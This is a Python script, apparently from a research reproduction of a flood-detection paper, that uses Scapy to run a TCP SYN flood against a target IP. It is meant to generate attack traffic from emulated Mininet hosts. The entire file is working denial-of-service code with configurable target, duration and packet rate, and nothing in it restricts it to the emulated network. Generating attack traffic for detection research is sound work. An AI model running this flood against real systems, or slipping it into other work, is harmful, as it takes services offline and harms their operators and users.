#!/usr/bin/env python3
"""TCP SYN flood attack using Scapy.

Invoked on attacker hosts (h1, h2) inside Mininet by fig3_topology.py when
running in --collect-attack mode.  Sends TCP SYN packets to the victim without
completing the handshake, exhausting the victim's half-open connection table —
the classic SYN flood attack described in the Flood Control paper.

Usage (driven by fig3_topology.py):
    python3 syn_flood.py --target 10.0.0.8 --duration 260

Usage (standalone inside Mininet CLI):
    h1 python3 simulation/syn_flood.py --target 10.0.0.8 --duration 60
"""

from __future__ import annotations

import argparse
import sys
import time

try:
    from scapy.all import IP, TCP, RandShort, send
except ImportError as exc:
    raise SystemExit(
        "scapy is required: pip install scapy\n"
        "See docs/steps/01-environment-setup/README.md"
    ) from exc


def syn_flood(target_ip: str, duration: float, inter: float = 0.001) -> int:
    """Send TCP SYN packets to target_ip for `duration` seconds.

    Args:
        target_ip: Victim IP address.
        duration:  Attack duration in seconds.
        inter:     Delay between packets in seconds (default 1 ms → ~1 kpps).

    Returns:
        Total packets sent.
    """
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        pkt = IP(dst=target_ip) / TCP(sport=RandShort(), dport=80, flags="S")
        send(pkt, verbose=False, inter=inter)
        count += 1
    return count


def _parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(description="TCP SYN flood attack using Scapy.")
    p.add_argument("--target", required=True, help="Victim IP address.")
    p.add_argument(
        "--duration", type=float, required=True, help="Attack duration in seconds."
    )
    p.add_argument(
        "--inter",
        type=float,
        default=0.001,
        help="Delay between packets in seconds (default: 0.001 = 1 ms).",
    )
    return p.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = _parse_args(sys.argv[1:] if argv is None else argv)
    print(
        f"[SYNFlood] target={args.target}"
        f"  duration={args.duration}s  inter={args.inter}s"
    )
    sent = syn_flood(args.target, args.duration, args.inter)
    print(f"[SYNFlood] Done. Sent {sent} SYN packets to {args.target}.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
